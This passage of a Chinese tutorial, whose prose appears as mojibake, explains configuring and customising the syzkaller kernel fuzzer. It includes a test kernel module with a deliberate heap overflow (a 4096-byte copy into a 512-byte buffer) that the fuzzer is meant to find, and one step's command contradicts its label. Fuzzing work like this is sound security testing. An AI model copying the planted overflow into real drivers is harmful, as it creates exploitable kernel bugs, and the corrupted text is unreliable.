å¦‚ä¸‹ï¼š\n\nç”±äºä¸Šä¸€æ­¥ä¸­create-image.shä¸­å¦‚ä¸‹eth0è·Ÿå®é™…qemuè™šæ‹Ÿæœºä¸­è¿è¡Œçš„ç½‘å¡åç§°ä¸ä¸€æ ·ï¼Œå¯¼è‡´ç½‘å¡æ²¡æœ‰åˆ†é…IPåœ°å€ã€‚æœ€åè§£å†³æ–¹æ³•å¦‚ä¸‹ï¼šqemuå¯åŠ¨è™šæ‹Ÿæœºï¼Œrootç”¨æˆ·èº«ä»½ç™»å½•åï¼Œè®¾ç½®ç½‘å¡IPåœ°å€ã€‚\n\n![](syzkaller-ethnet.png)\n\nå‚è€ƒæ–‡ç« ï¼šï¼ˆ1ï¼‰[ç½‘å¡æ²¡åˆ†é…IPåœ°å€çš„è§£å†³æ–¹æ³•](https://blog.csdn.net/wuzhong8809/article/details/83374140)ï¼ˆ2ï¼‰[rsaå…¬ç§é’¥çŸ¥è¯†ç‚¹](https://xuanxuanblingbling.github.io/ctf/web/2019/05/10/rsa/)ï¼ˆ3ï¼‰[ä¸€ä¸ªè‡ªå·±ç”Ÿæˆå…¬ç§é’¥é…ç½®çš„æ–¹æ³•](http://embedsec.systems/zh/gnulinux-security/2017/06/05/syzkaller.html)\n\n```shell\n# å…³é—­qemuè™šæ‹Ÿæœº\nkill $(cat vm.pid)\n```\n\n## å¯åŠ¨syzkaller - qemu\n\nä¸ºäº†ä½¿syzkallerè¿è¡Œèµ·æ¥ï¼Œåœ¨syzkallerç›®å½•ä¸‹ï¼Œæ–°å»ºä¸€ä¸ªworkdirç›®å½•ï¼Œå¹¶æ–°å»ºä¸€ä¸ªconfigæ–‡ä»¶ç”¨äºé…ç½®è¿è¡Œæ‰€éœ€å‚æ•°ï¼ˆå‘½åä¸ºxxx.cfgï¼‰\n\n```shell\nmkdir workdir\n./bin/syz-manager -config=abcd.cfg\n```\n\ncfgæ–‡ä»¶çš„æ ¼å¼å¦‚ä¸‹ï¼Œæ ¹æ®å®é™…æƒ…å†µå„å‚æ•°å¯åšæ›´æ”¹ï¼š\n\n```\n{\n        \"target\": \"linux/amd64\",\n        \"http\": \"127.0.0.1:56741\",\n        \"workdir\": \"/home/bling/gopath/src/github.com/google/syzkaller/workdir\",\n        \"kernel_obj\": \"/home/bling/linux\",\n        \"image\": \"/home/bling/s_image/stretch.img\",\n        \"sshkey\": \"/home/bling/s_image/stretch.id_rsa\",\n        \"syzkaller\": \"/home/bling/gopath/src/github.com/google/syzkaller/\",\n        \"procs\": 8,\n        \"type\": \"qemu\",\n        \"vm\": {\n                \"count\": 4,\n                \"kernel\": \"/home/bling/linux/arch/x86/boot/bzImage\",\n                \"cpu\": 2,\n                \"mem\": 2048\n        }\n}\n```\n\næ‰§è¡ŒæˆåŠŸåï¼Œå¦‚ä¸‹å›¾æ‰€ç¤ºï¼š\n\n![](syzkaller-running.png)\n\n## å¯åŠ¨syzkaller - isolated\n\nå¯¹äºä¸¤å°é€šè¿‡ç½‘ç»œè¿æ¥çš„ç‹¬ç«‹æœºå™¨ï¼Œä½¿ç”¨syzkallerè¿›è¡Œfuzzæ—¶ï¼Œéœ€è¦è®¾ç½®sshè¿æ¥å¹¶æ›´æ”¹configé…ç½®æ–‡ä»¶ã€‚\n\n> ps. ç”±äºæ²¡æœ‰ä¸¤å°ç‰©ç†æœºï¼Œè¿™é‡Œå¤ç”¨ä¸Šä¸€æ­¥çš„qemuï¼Œä¸åŒç‚¹åœ¨äºå°†è™šæ‹Ÿæœºå’Œç‰©ç†æœºçœ‹ä½œä¸¤å°ç‹¬ç«‹è¿è¡Œçš„æœºå™¨\n\nå¯å‚è€ƒå¦‚ä¸‹æ­¥éª¤ï¼Œå…ˆé…ç½®å¥½å¾…æµ‹è¯•è®¾å¤‡ï¼Œç„¶åå†è¿è¡Œsyzkallerã€‚\n\n### é…ç½®å¥½å¾…æµ‹è¯•è®¾å¤‡\n\nåœ¨ä½¿ç”¨syzkallerè¿›è¡Œfuzzä¹‹å‰ï¼Œéœ€è¦ç¡®ä¿ç›®æ ‡è®¾å¤‡ä¸Šè¿è¡Œç€ä¸Šä¸€æ­¥ç¼–è¯‘çš„å†…æ ¸ï¼Œå¹¶ä¸”è®¾ç½®å¥½äº†sshè¿æ¥ã€‚\n\nå¯å‚è€ƒå®˜æ–¹æ–‡æ¡£ï¼š[setup_linux-host_isolated](https://github.com/google/syzkaller/blob/master/docs/linux/setup_linux-host_isolated.md)\n\næç‚¼ä¸€ä¸‹ï¼Œéœ€ä¿è¯å¦‚ä¸‹å‡ ç‚¹ï¼š\n\n1. **å¾…æµ‹è¯•è®¾å¤‡ä¸Šè¿è¡Œç€sshæœåŠ¡**\n\n2. **æ‰“å¼€sshçš„AllowTcpForwardingé€‰é¡¹**\n\n   ```shell\n   ~# grep Forwarding /etc/ssh/sshd_config\n   AllowTcpForwarding yes\n   ```\n\n3. **é…ç½®sshæ— å¯†ç è¿æ¥**\n\n   ```bash\n   # åœ¨æœ¬åœ°ç”Ÿæˆå…¬ç§é’¥å¯¹æ–‡ä»¶\n   ssh-keygen -t rsa\n   # ç„¶åï¼Œå°†å…¬é’¥æ–‡ä»¶æ‹·è´åˆ°ç›®æ ‡æµ‹è¯•æœºå™¨çš„/root/.ssh/ç›®å½•ä¸‹ï¼Œå¹¶é‡å‘½åä¸ºauthorized_keys\n   ```\n\n### è¿è¡Œsyzkaller\n\n1. åœ¨æœ¬åœ°å’Œç›®æ ‡è®¾å¤‡ä¸Šå„åˆ›å»ºä¸€ä¸ªå·¥ä½œç›®å½•\n\n   ```bash\n   # æœ¬åœ°ï¼š\n   cd syzkaller\n   mkdir workdir\n   # è¿œç«¯ï¼š\n   cd home\n   mkdir fuzzdir\n   ```\n\n2. åœ¨syzkallerç›®å½•ä¸‹æ–°å»ºä¸€ä¸ªfuzz.cfgæ–‡ä»¶\n\n   ```xml\n   {\n   \t\"target\": \"linux/amd64\",\n   \t\"http\": \"127.0.0.1:56741\",\n   \t\"rpc\": \"127.0.0.1:0\",\n   \t\"sshkey\" : \"//home/bling/qemu-img/stretch.id_rsa\",\n   \t\"workdir\": \"/home/bling/syzkaller/workdir\",\n   \t\"kernel_obj\": \"/home/bling/linux\",\n   \t\"syzkaller\": \"/home/bling/syzkaller\",\n   \t\"sandbox\": \"setuid\",\n   \t\"type\": \"isolated\",\n   \t\"vm\": {\n   \t\t\"targets\" : [ \"127.0.0.1:10021\" ],\n   \t\t\"pstore\": false,\n   \t\t\"target_dir\" : \"/home/fuzzdir\",\n       \"target_reboot\" : false\n   \t}\n   }\n   ```\n\n   - targetæŒ‡å®šå¾…æµ‹è¯•è®¾å¤‡çš„æ“ä½œç³»ç»Ÿå†…æ ¸åŠcpuæ¶æ„\n   - vm.targetsæŒ‡å®šå¾…fuzzè®¾å¤‡çš„ipåœ°å€åŠsshç«¯å£ï¼ˆé»˜è®¤æ˜¯22ï¼‰\n   - enbale_syscallsï¼šæµ‹è¯•ç‰¹å®šçš„å‡ ä¸ªç³»ç»Ÿè°ƒç”¨\n   - disable_syscallsï¼šä¸è°ƒç”¨æŸå‡ ä¸ªç³»ç»Ÿè°ƒç”¨\n\n   å¯¹å„ä¸ªå­—æ®µçš„è§£é‡Šï¼Œè´´ä¸¤ä¸ªå®˜æ–¹æ–‡æ¡£ï¼š\n\n   [configæ–‡ä»¶ä¸­å„å­—æ®µçš„è§£é‡Š](https://github.com/google/syzkaller/blob/master/pkg/mgrconfig/config.go)\n\n   [isolatedæƒ…å†µä¸‹vmå­—æ®µä¸­å‚æ•°çš„è§£é‡Š](https://github.com/google/syzkaller/blob/master/vm/isolated/isolated.go)\n\n   > ps. \"kernel_obj\"åˆ é™¤ä¸æŒ‡å®šä¹Ÿæ˜¯å¯ä»¥çš„ï¼ŒåŒºåˆ«åœ¨äºæ— æ³•åœ¨webé¢æ¿ä¸­æŸ¥çœ‹ä»£ç è¦†ç›–ç‡æƒ…å†µ\n\n3. å¯åŠ¨syzkaller\n\n   ```\n   ./bin/syz-manager -config=fuzz.cfg\n   ```\n\n\n# æé«˜fuzzæ•ˆç‡\n\nsyzkalleræ— æ³•æ ¹æ®æºç è‡ªåŠ¨åˆ†æå‡ºæœ‰å“ªäº›è®¾å¤‡èŠ‚ç‚¹ï¼Œä¹Ÿæ— æ³•è·å¾—ç³»ç»Ÿè°ƒç”¨åŠå‚æ•°ä¿¡æ¯ã€‚å¦‚æœä¸é’ˆå¯¹å†…æ ¸ç‰ˆæœ¬è¿›ä¸€æ­¥å®šåˆ¶ï¼Œé‚£ä¹ˆfuzzæ•ˆç‡å°†éå¸¸ä½ã€‚\n\n## å®šåˆ¶syscall description\n\n[syscall descriptionså®˜æ–¹è¯´æ˜](https://github.com/google/syzkaller/blob/master/docs/syscall_descriptions.md)\n\nsyzkallerè‡ªå·±å®šä¹‰äº†ä¸€å¥—æè¿°ç³»ç»Ÿè°ƒç”¨æ¨¡ç‰ˆçš„å£°æ˜å¼è¯­è¨€ï¼ˆsyzlangï¼‰ï¼Œæˆ‘ç§°ä¹‹ä¸ºæè¿°æ–‡ä»¶/å£°æ˜æ–‡ä»¶ã€‚\n\nä¸ºäº†æé«˜fuzzæ•ˆç‡ï¼Œæˆ‘ä»¬å¿…é¡»ä¸ºç›®æ ‡ç³»ç»Ÿé‡èº«å®šåˆ¶è¿™ç§å£°æ˜æ–‡ä»¶ã€‚é€šå¸¸ä¸€ä¸ªè®¾å¤‡èŠ‚ç‚¹å¯¹åº”ä¸€ä¸ªå£°æ˜æ–‡ä»¶ã€‚\n\næ‰€è°“çš„å£°æ˜æ–‡ä»¶å°±æ˜¯ä¸€ä¸ªtxtï¼Œæ ¹æ®syzkallerå®šä¹‰çš„è¯­æ³•ï¼Œåœ¨è¿™ä¸ªtxtæ–‡æ¡£ä¸­æè¿°è®¾å¤‡èŠ‚ç‚¹çš„æ¥å£ä¿¡æ¯ä»¥åŠå‚æ•°æ ¼å¼ã€‚\n\n### ç”¨syzlangæè¿°ç³»ç»Ÿè°ƒç”¨\n\nå®šåˆ¶ï¼ˆå³å¯¹æ–°çš„å†…æ ¸æ¥å£ï¼Œå¢åŠ ç³»ç»Ÿè°ƒç”¨æè¿°æ–‡ä»¶ï¼‰æ˜¯ä¸€ä¸ªæ¯”è¾ƒç¹ççš„è¿‡ç¨‹ï¼Œå®˜æ–¹ç»™äº†å¦‚ä¸‹æ–‡æ¡£ç”¨ä½œå‚è€ƒï¼š\n\n- txtå£°æ˜æ–‡ä»¶çš„è¯­æ³•ï¼š [syscall descriptionè¯­æ³•](https://github.com/google/syzkaller/blob/master/docs/syscall_descriptions_syntax.md)\n\n- ä¸€äº›linuxä¸‹çš„syscall descriptionï¼š[ç°æœ‰å¯å‚è€ƒçš„å£°æ˜æ–‡ä»¶](https://github.com/google/syzkaller/tree/master/sys/linux)\n\nä¸¾ä¸€ä¸ªä¾‹å­ï¼Œä»ç³»ç»Ÿè°ƒç”¨open()å‡½æ•°å¼€å§‹ï¼Œå®ƒçš„å‡½æ•°å®šä¹‰å¦‚ä¸‹ï¼š\n\n```c\nint open(const char *pathname, int flags, mode_t mode);\n```\n\n- flagsï¼š`O_RDONLY, O_WRONLY, O_RDWR, O_APPEND, FASYNC, O_CLOEXEC, O_CREAT, O_DIRECT, O_DIRECTORY, O_EXCL, O_LARGEFILE, O_NOATIME, O_NOCTTY, O_NOFOLLOW, O_NONBLOCK, O_PATH, O_SYNC, O_TRUNC, __O_TMPFILE`\n- modeï¼š`S_IRUSR, S_IWUSR, S_IXUSR, S_IRGRP, S_IWGRP, S_IXGRP, S_IROTH, S_IWOTH, S_IXOTH`\n\nç”¨syzlangæ¥æè¿°å®ƒï¼š\n\n```bash\nresource fd_test[fd]\nopen(file ptr[in, filename], flags flags[open_flags], mode flags[open_mode]) fd_test\n# æˆ–\n# open(file ptr[in, string[\"/dev/xxx\"]], flags flags[open_flags], mode flags[open_mode]) fd_test\n```\n\n- `file ptr[in, filename]`ï¼šopen()å‡½æ•°çš„ç¬¬ä¸€ä¸ªå‚æ•°ï¼Œå‘½åä¸ºfileï¼Œæ˜¯ä¸€ä¸ªè¾“å…¥æŒ‡é’ˆç±»å‹ï¼ŒæŒ‡é’ˆæŒ‡å‘ä¸€ä¸ªæ–‡ä»¶åå­—ç¬¦ä¸²\n- `flags flags[open_flags]`ï¼šflagsè¡¨æ˜è¯¥å‚æ•°æ˜¯open_flagsæ•°ç»„ä¸­çš„ä»»æ„ä¸€ä¸ªå€¼\n  - `open_flags = O_WRONLY, O_RDWR, O_APPEND, ...`\n- `mode flags[open_mode]`ï¼šflagsè¡¨æ˜è¯¥å‚æ•°æ˜¯open_modeæ•°ç»„ä¸­çš„ä»»æ„ä¸€ä¸ªå€¼\n  - `open_mode = S_IRUSR, S_IWUSR, S_IXUSR, ...`\n\n- `fd_test`ï¼šopen()å‡½æ•°çš„è¿”å›å€¼å°†ç»™fd_testï¼Œè¿™æ˜¯ä¸€ä¸ªæ–‡ä»¶æè¿°ç¬¦\n\n`fd_test`å°†è¢«ç”¨äºå…¶ä»–ç³»ç»Ÿè°ƒç”¨ï¼Œå¦‚readã€writeã€ioctl\n\n```\nread(fd_1 fd_test, buf buffer[out], count len[buf])\nwrite(fd_1 fd_test, buf buffer[in], count len[buf])\n```\n\n- bufferæ˜¯ä»»æ„å¤§å°çš„æ•°ç»„ç©ºé—´ï¼Œå¡«æ»¡äº†int8ç±»å‹çš„å€¼ã€‚å¯ä»¥æ˜¯è¾“å…¥å‚æ•°ä¹Ÿå¯ä»¥ä½œä¸ºè¾“å‡ºå‚æ•°ã€‚\n- len[buf]å¾—åˆ°bufçš„é•¿åº¦\n\nioctlé€šå¸¸æ‰¿è½½æ›´å¤šæ›´å¤æ‚çš„åŠŸèƒ½ï¼Œsyzkalleré’ˆå¯¹ioctlæä¾›äº†ä¸€ç§é€šç”¨çš„æè¿°æ–¹æ³•ï¼š\n\n```\nioctl(fd_1 fd_test, cmd intptr, arg buffer[in])\n```\n\nä¸Šé¢è¿™ç§æ–¹å¼å¹¶ä¸å‡†ç¡®ï¼Œä¸ºäº†æ›´ç²¾ç¡®åœ°è§¦å‘iocltä¸­å„ä¸ªcaseåˆ†æ”¯ï¼Œé€šå¸¸éœ€è¦åšé¢å¤–çš„é€‚é…å·¥ä½œï¼š\n\n```\nioctl$DRM_IOCTL_VERSION(fd fd_dri, cmd const[DRM_IOCTL_VERSION], arg ptr[in, drm_version])\nioctl$VIDIOC_QUERYCAP(fd fd_video, cmd const[VIDIOC_QUERYCAP], arg ptr[out, v4l2_capability])\n...\n```\n\n- `DRM_IOCTL_VERSION`å’Œ`VIDIOC_QUERYCAP`æ˜¯ioctlä¸­çš„æŸä¸¤ä¸ªcaseåˆ†æ”¯\n\n- `drm_version`å’Œ`v4l2_capability`åˆ†åˆ«æ˜¯ä»¥ä¸Šä¸¤ä¸ªåˆ†æ”¯å…¶argæŒ‡é’ˆæŒ‡å‘çš„ç»“æ„ä½“ï¼ˆåŒæ ·éœ€è¦ç”¨syzlangæè¿°ï¼‰\n\nå¯ä»¥å¯¹æ¯”å¦‚ä¸‹å‚è€ƒæ–‡ä»¶ï¼Œå­¦ä¹ åŸºæœ¬ä½¿ç”¨æ–¹æ³•ï¼š\n\n- /dev/randomå­—ç¬¦è®¾å¤‡\n  - randomæºç è·¯å¾„ï¼šlinux/drivers/char/random.c\n  - randomæè¿°æ–‡ä»¶ï¼šhttps://github.com/google/syzkaller/blob/master/sys/linux/dev_random.txt\n\n- /dev/ptmxå­—ç¬¦è®¾å¤‡\n  - ptmxæºç è·¯å¾„ï¼šlinux/drivers/tty/tty_ioctl.c\n  - ptmxæè¿°æ–‡ä»¶ï¼šhttps://github.com/google/syzkaller/blob/master/sys/linux/dev_ptmx.txt\n\n### å°†æè¿°ä¿¡æ¯ç¼–è¯‘è¿›syzkaller\n\né‚£ä¹ˆï¼Œæ•´ä¸ªå®šåˆ¶è¿‡ç¨‹åˆ†ä¸º4æ­¥ï¼š\n\n1. æ ¹æ®ç›®æ ‡å†…æ ¸æ¨¡å—çš„ä¿¡æ¯ï¼Œæ’°å†™ç¬¦åˆsyzlangè¯­æ³•çš„txtå£°æ˜æ–‡ä»¶\n2. syz-extractæ ¹æ®txtåŠlinuxæºç ï¼Œæå–ç¬¦å·å¸¸é‡çš„å€¼ï¼Œç”Ÿæˆä¸­é—´æ–‡ä»¶***.constæ–‡ä»¶\n3. syz-sysgenæ ¹æ®constæ–‡ä»¶ç”Ÿæˆsyzkalleræ‰§è¡Œæ—¶ä½¿ç”¨çš„goæ–‡ä»¶\n4. é‡æ–°ç¼–è¯‘syzkaller\n\nå¦‚æœsyzkaller/binç›®å½•ä¸‹ï¼Œæ²¡æœ‰syz-extractå’Œsyz-sysgenè¿™ä¸¤ä¸ªæ–‡ä»¶çš„è¯ï¼Œéœ€è¦æ‰§è¡Œå¦‚ä¸‹å‘½ä»¤ç¼–è¯‘ï¼š\n\n```bash\nmake bin/syz-extract\nmake bin/syz-sysgen\n```\n\nå®ƒä¿©çš„å…³ç³»æ˜¯è¿™æ ·çš„ï¼š\n\n```\n         +-------+            +---------+           +------+\n         |xxx.txt+----------->|xxx.const+---------->|xxx.go|\n         +---+---+            +---------+           +------+\n             |    syz-extract            syz-sysgen    ^\n             |                                         |\n             +-----------------------------------------+\n```\n\næˆ‘ä»¬é’ˆå¯¹æŸä¸ªé©±åŠ¨æ¥å£å†™å‡ºxxx.txtï¼Œç„¶åä½¿ç”¨syz-extractåˆ©ç”¨txtå’Œæºç ç”Ÿæˆconstæ–‡æ¡£ï¼Œæœ€åæ‰§è¡Œsyz-sysgenæ—¶syzkallerä¼šæ ¹æ®txtå’Œconstç”Ÿæˆä¸€ä¸ªgoæ–‡ä»¶ã€‚å¯åœ¨sys/linux/gen/amd64.goå’Œexecutor/syscalls.hä¸­çœ‹åˆ°ç»“æœã€‚\n\n\n\n\n\n## ä¸€æ¬¡å®šåˆ¶ç¤ºä¾‹ï¼ˆisolatedï¼‰\n\n- ç¼–å†™ä¸€ä¸ªæœ‰æ¼æ´çš„é©±åŠ¨æ¥å£ï¼Œå¹¶å°†å…¶ç¼–è¯‘è¿›å†…æ ¸ï¼ˆæˆ–è€…ä½¿ç”¨æ‰“koçš„æ–¹å¼ï¼‰ã€‚\n- ç¼–å†™é©±åŠ¨æ¥å£å¯¹åº”çš„txtæ–‡ä»¶ï¼Œå°†å…¶æ”¾å…¥syzkaller/sys/linuxç›®å½•ä¸‹ï¼Œç”Ÿæˆgoæ–‡ä»¶å¹¶é‡æ–°ç¼–è¯‘syzkallerã€‚\n- è¿è¡Œsyzkallerï¼Œæ”¹configæ–‡ä»¶æŒ‡å®šfuzzæ¥å£æé«˜é€Ÿç‡ï¼Œæœ€ååˆ†æcrashã€‚\n\n### ç¼–è¯‘è¿›å†…æ ¸\n\n> æ–¹æ³•1ï¼šå°†å†…æ ¸æ¨¡å—ç¼–è¯‘è¿›å†…æ ¸\n\n#### ä¸€ä¸ªæœ‰æ¼æ´çš„å†…æ ¸æ¨¡å—\n\n1. åœ¨`kernel_src/drivers/char`ç›®å½•ä¸‹ï¼Œæ–°å»ºä¸€ä¸ª[testxy.c](testxy.c)ã€‚è¿™æ˜¯ä¸€ä¸ªæœ‰æ¼æ´çš„å†…æ ¸æ¨¡å—ï¼Œæ¼æ´ä»£ç ç‰‡æ®µå¦‚ä¸‹ï¼š\n\n   ```c\n   static ssize_t proc_write (struct file *proc_file, const char __user *proc_user, size_t n, loff_t *loff)\n   {\n       char *c = kmalloc(512, GFP_KERNEL);\n       copy_from_user(c, proc_user, 4096);\n       printk(\":into write!\\n\");\n       return 0;\n   }\n   ```\n\n2. æ‰“å¼€char/ç›®å½•ä¸‹çš„Kconfigæ–‡ä»¶ï¼Œæ·»åŠ ï¼š\n\n   ```bash\n   config TESTXY_MODULE\n           tristate \"heap overflow test\"\n           default y\n           help\n             This file is to test a buffer overflow\n   ```\n\n3. æ‰“å¼€char/ç›®å½•ä¸‹çš„Makefileæ–‡ä»¶ï¼Œæ·»åŠ ï¼š\n\n   ```bash\n   obj-$(CONFIG_TESTXY_MODULE) += testxy.o\n   ```\n\nâ€‹\t\tè‹¥/linux/drivers/char/æ˜¯æ–°ç›®å½•ï¼Œè¿˜éœ€ä¿®æ”¹/linux/drivers/Kconfigï¼ˆåŠ ä¸Šsource \"drivers/char/Kconfig\"ï¼‰ï¼›ä¿®æ”¹/linux/drivers/Makefileï¼ˆåŠ ä¸Šobj-$(CONFIG_TEST_MODULE) += char/ï¼‰ã€‚\n\n4. make menuconfigæ—¶å¯ä»¥åœ¨`Device Drivers -> Heap Overflow Test` (*è¡¨ç¤ºç›´æ¥ç¼–å…¥å†…æ ¸ï¼ŒMè¡¨ç¤ºæ¨¡å—å½¢å¼) å¤„çœ‹åˆ°åˆšåˆšæ·»åŠ çš„æµ‹è¯•æ¨¡å—ã€‚\n\n   ```bash\n   make clean\n   make menuconfig\n   make -j8\n   ```\n\n5. ç”¨æ–°çš„å†…æ ¸å¯åŠ¨è™šæ‹Ÿæœºï¼ŒæŸ¥çœ‹æ¨¡å—æ˜¯å¦åŠ è½½æˆåŠŸ\n\n   ```bash\n   # æŸ¥çœ‹æ¨¡å—å¯¹åº”è®¾å¤‡èŠ‚ç‚¹æ˜¯å¦å­˜åœ¨\n   ls /proc/test1\n   # æŸ¥çœ‹æ¨¡å—åŠ è½½æ—¶çš„logä¿¡æ¯\n   dmesg | grep \"proc init\"\n   ```\n\n#### å®šåˆ¶txtç³»ç»Ÿè°ƒç”¨æè¿°æ–‡ä»¶\n\n1. syzkalleræºç ä¸­ï¼Œæ‰¾åˆ°sys/linux/ç›®å½•ï¼Œæ–°å»ºä¸€ä¸ªæ–‡ä»¶ï¼Œå‘½åä¸º`proc_testxy.txt`ï¼Œå†…å®¹å¦‚ä¸‹ï¼š\n\n   ```shell\n   include <linux/fs.h>\n   \n   open$testxy(file ptr[in, string[\"/proc/test1\"]], flags flags[proc_open_flags], mode flags[proc_open_mode]) fd\n   read$testxy(fd fd, buf buffer[out], count len[buf]) len[buf]\n   write$testxy(fd fd, buf buffer[in], count len[buf]) len[buf]\n   \n   proc_open_flags = O_RDONLY, O_WRONLY, O_RDWR, O_APPEND, FASYNC, O_CLOEXEC, O_CREAT, O_DIRECT, O_DIRECTORY, O_EXCL, O_LARGEFILE, O_NOATIME, O_NOCTTY, O_NOFOLLOW, O_NONBLOCK, O_PATH, O_SYNC, O_TRUNC, __O_TMPFILE\n   proc_open_mode = S_IRUSR, S_IWUSR, S_IXUSR, S_IRGRP, S_IWGRP, S_IXGRP, S_IROTH, S_IWOTH, S_IXOTH\n   ```\n\n2. ä½¿ç”¨syz-extractç”Ÿæˆconstæ–‡ä»¶ã€‚æŒ‡å®štxtæ–‡ä»¶åï¼Œå¯å•ç‹¬ç”Ÿæˆè¯¥æ–‡ä»¶å¯¹åº”çš„constæ–‡ä»¶ã€‚\n\n   ```shell\n   bin/syz-extract -os linux -arch amd64 -sourcedir \"/home/bling/linux\" proc_testxy.txt\n   ```\n\n3. è¿è¡Œsyz-sysgen\n\n   ```\n   bin/syz-extract\n   ```\n\n4. é‡æ–°ç¼–è¯‘syzkaller\n\n   ```shell\n   make generate\n   make\n   ```\n\n#### éªŒè¯èƒ½å¦æˆåŠŸè§¦å‘crash\n\nå¯åŠ¨syzkallerçš„é…ç½®æ–‡ä»¶å¦‚ä¸‹ã€‚ä¸ºäº†æ›´å¿«çœ‹åˆ°crashç»“æœï¼Œå¢åŠ äº†â€œenable_syscallsâ€é¡¹ï¼Œåªå…è®¸æŸäº›ç³»ç»Ÿè°ƒç”¨ï¼Œèƒ½æ›´å¿«åœ°è§¦å‘æ¼æ´ã€‚\n\n```\n{\n\t\"target\": \"linux/amd64\",\n\t\"http\": \"127.0.0.1:56741\",\n\t\"rpc\": \"127.0.0.1:0\",\n\t\"sshkey\" : \"//home/bling/qemu-img/stretch.id_rsa\",\n\t\"workdir\": \"/home/bling/syzkaller/workdir\",\n\t\"kernel_obj\": \"/home/bling/linux\",\n\t\"syzkaller\": \"/home/bling/syzkaller\",\n\t\"sandbox\": \"setuid\",\n\t\"type\": \"isolated\",\n\t\"enable_syscalls\":[\n        \t\t\"open$testxy\",\n        \t\t\"read$testxy\",\n        \t\t\"write$testxy\",\n        \t\t\"close$testxy\"\n     ],\n\t\"vm\": {\n\t\t\"targets\" : [ \"127.0.0.1:10021\" ],\n\t\t\"pstore\": false,\n\t\t\"target_dir\" : \"/home/fuzzdir\",\n    \"target_reboot\" : false\n\t}\n}\n```\n\nå¯åŠ¨syzkallerè¿›è¡Œæµ‹è¯•ï¼š\n\n```\n./bin/syz-manager -config=abcd.cfg\n```\n\nè§¦å‘åˆ°æ¼æ´åˆ†æ”¯ï¼ï¼ˆå›¾ç‰‡è·Ÿç¬”è®°ç¨å¾®æœ‰ç‚¹åŒºåˆ«ï¼Œå›¾ç‰‡æ˜¯ä¸¤å¹´å‰çš„ï¼Œç¬”è®°æ˜¯22å¹´æ›´æ–°çš„ï¼‰\n\n![](syzkaller-display1.png)\n\n![](syzkaller-display2.png)\n\n![](syzkaller-display3.png)\n\n\n\n### æ‰“ko\n\n> æ–¹æ³•2ï¼šinsmodæ–¹å¼æ¤å…¥å†…æ ¸æ¨¡å—\n\næºç åŠmakefileæ–‡ä»¶ï¼š[test.c](test.c)å’Œ[Makefile](Makefile)ã€‚ç¼–è¯‘å®Œæˆåï¼Œinsmodè¿›å¾…fuzzçš„linuxç³»ç»Ÿä¸­ã€‚\n\né€šè¿‡å¦‚ä¸‹5ä¸ªæ­¥éª¤å®Œæˆå®šåˆ¶ï¼š\n\n1. åœ¨sys/linux/ç›®å½•ä¸‹ï¼Œæ–°å»ºé’ˆå¯¹ç›®æ ‡å†…æ ¸æ¨¡å—çš„txtå£°æ˜æ–‡ä»¶ï¼ˆæœ¬ä¾‹ä¸­å°†å…¶å‘½åä¸º`proc_test.txt`ï¼‰\n\n   ```\n   include <linux/fs.h>\n   \n   resource fd_111[fd]\n   \n   open$aaa(file ptr[in, string[\"/proc/newtest\"]], flags flags[proc_open_flags], mode flags[proc_open_mode]) fd_111\n   read$aaa(fd_a fd_111, buf buffer[out], count len[buf])\n   write$aaa(fd_a fd_111, buf buffer[in], count len[buf])\n   \n   proc_open_flags = O_RDONLY, O_WRONLY, O_RDWR, O_APPEND, FASYNC, O_CLOEXEC, O_CREAT, O_DIRECT, O_DIRECTORY, O_EXCL, O_LARGEFILE, O_NOATIME, O_NOCTTY, O_NOFOLLOW, O_NONBLOCK, O_PATH, O_SYNC, O_TRUNC, __O_TMPFILE\n   proc_open_mode = S_IRUSR, S_IWUSR, S_IXUSR, S_IRGRP, S_IWGRP, S_IXGRP, S_IROTH, S_IWOTH, S_IXOTH\n   \n   ```\n\n2. æ‰§è¡Œsyz-extract\n\n   ```\n   bin/syz-extract -os linux -arch amd64 -sourcedir \"/home/bling/linux\" proc_test.txt\n   ```\n\n   è¯¥æ­¥éª¤å°†åœ¨sys/linux/ç›®å½•ä¸‹äº§ç”Ÿä¸€ä¸ªåä¸º`proc_test.txt.const`çš„æ–‡ä»¶\n\n3. æ‰§è¡Œsyz-sysgen\n\n   ```\n   bin/syz-sysgen\n   ```\n\n   è¯¥æ­¥éª¤å°†æ›´æ–°syzkaller/sys/linux/gen/amd64.goï¼Œè‡ªåŠ¨æ·»åŠ ä¸Šæ–°å®šä¹‰çš„ç³»ç»Ÿè°ƒç”¨ï¼Œå¦‚ä¸‹ç‰‡æ®µï¼š\n\n   ```\n   {NR:2,Name:\"open$aaa\",CallName:\"open\",Args:[]Field{\n   {Name:\"file\",Type:Ref(9200)},\n   {Name:\"flags\",Type:Ref(5481)},\n   {Name:\"mode\",Type:Ref(6042)},\n   },Ret:Ref(11058)},\n   \n   {Name:\"read$aaa\",CallName:\"read\",Args:[]Field{\n   {Name:\"fd\",Type:Ref(11058)},\n   {Name:\"buf\",Type:Ref(10466)},\n   {Name:\"count\",Type:Ref(6978)},\n   }},\n   \n   {NR:1,Name:\"write$aaa\",CallName:\"write\",Args:[]Field{\n   {Name:\"fd\",Type:Ref(11058)},\n   {Name:\"buf\",Type:Ref(8697)},\n   {Name:\"count\",Type:Ref(6978)},\n   }},\n   ```\n\n4. é‡æ–°ç¼–è¯‘syzkaller\n\n   ```\n   make generate\n   make\n   ```\n\n5. æŒ‡å®šsyscallï¼Œé‡æ–°è¿è¡Œsyzkaller\n\n   ```\n   {\n   \t\"target\": \"linux/amd64\",\n   \t\"http\": \"127.0.0.1:56741\",\n   \t\"rpc\": \"127.0.0.1:0\",\n   \t\"sshkey\" : \"//home/bling/qemu-img/stretch.id_rsa\",\n   \t\"workdir\": \"/home/bling/syzkaller/workdir\",\n   \t\"kernel_obj\": \"/home/bling/linux\",\n   \t\"syzkaller\": \"/home/bling/syzkaller\",\n   \t\"sandbox\": \"setuid\",\n   \t\"type\": \"isolated\",\n   \t\"enable_syscalls\": [\"open$aaa\", \"read$aaa\", \"write$aaa\"],\n   \t\"vm\": {\n   \t\t\"targets\" : [ \"127.0.0.1:10021\" ],\n   \t\t\"pstore\": false,\n   \t\t\"target_dir\" : \"/home/fuzzdir\",\n       \"target_reboot\" : true\n   \t}\n   }\n   ```\n\n   æ‰§è¡Œ`./bin/syz-manager -config=abcd.cfg`ï¼Œå¼€å§‹fuzzã€‚\n\n\n\n# é™„å½•\n\n## 1 å®‰è£…GCC\n\n> 